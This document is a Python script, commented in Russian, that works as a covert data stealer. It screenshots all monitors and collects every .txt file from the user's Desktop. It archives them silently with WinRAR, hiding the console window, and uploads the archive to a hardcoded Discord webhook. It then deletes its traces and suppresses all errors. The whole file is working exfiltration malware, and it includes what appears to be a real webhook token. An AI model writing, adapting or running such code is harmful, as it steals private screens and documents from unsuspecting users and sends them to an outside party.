import os
import subprocess
import requests
import tempfile
import shutil
import time
from PIL import ImageGrab
import win32api

# Конфигурация
WEBHOOK_URL = "https://discord.com/api/webhooks/1372645079591682118/5nVbVwtrH_nbMjR-BjghhwtTXNbCYEFMeWgDKRIL-nSTvabb7artUs6IwrGhN8B4HfCk"
WINRAR_PATH = "C:\\Program Files\\WinRAR\\Rar.exe"
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")

def take_screenshot():
    """Делает скриншот всех мониторов"""
    try:
        monitors = win32api.EnumDisplayMonitors()
        bbox = (0, 0, 0, 0)
        for m in monitors:
            info = win32api.GetMonitorInfo(m[0])
            mon = info['Monitor']
            bbox = (
                min(bbox[0], mon[0]),
                min(bbox[1], mon[1]),
                max(bbox[2], mon[2]),
                max(bbox[3], mon[3])
            )
        
        screenshot = ImageGrab.grab(bbox)
        screenshot_path = os.path.join(DESKTOP_PATH, "SCREENSHOT_{}.png".format(int(time.time())))
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(DESKTOP_PATH, "SCREENSHOT_{}.png".format(int(time.time())))
        screenshot.save(screenshot_path)
        return screenshot_path

def create_rar_archive(screenshot_path):
    """Создаёт RAR без пароля"""
    try:
        temp_dir = tempfile.mkdtemp()
        archive_path = os.path.join(temp_dir, "DESKTOP_{}.rar".format(int(time.time())))
        
        # Собираем файлы
        files_to_archive = [screenshot_path]
        for f in os.listdir(DESKTOP_PATH):
            if f.endswith(".txt"):
                files_to_archive.append(os.path.join(DESKTOP_PATH, f))
        
        if not files_to_archive:
            return None, "No files to archive"
        
        # Ключи WinRAR (без пароля!)
        cmd = [
            WINRAR_PATH,
            "a",           # добавить файлы
            "-ep1",        # исключить базовый путь
            "-idq",        # тихий режим
            "-m5",         # максимальное сжатие
            archive_path,
            *files_to_archive
        ]
        
        subprocess.run(cmd, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return archive_path, None
        
    except Exception as e:
        return None, str(e)
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            requests.post(
                WEBHOOK_URL,
                files={"file": (os.path.basename(file_path), f.read())},
                timeout=30
            )
        return True
    except Exception:
        return False

def clean_up(temp_dir):
    time.sleep(180)
    try:
        shutil.rmtree(temp_dir)
    except Exception:
        pass

if __name__ == "__main__":
    try:
        # Проверка WinRAR
        if not os.path.exists(WINRAR_PATH):
            exit("WinRAR not found")
            
        # Основной процесс
        screenshot = take_screenshot()
        rar_path, error = create_rar_archive(screenshot)
        
        if not error:
            send_to_discord(rar_path)
            clean_up(os.path.dirname(rar_path))
    except Exception:
        pass
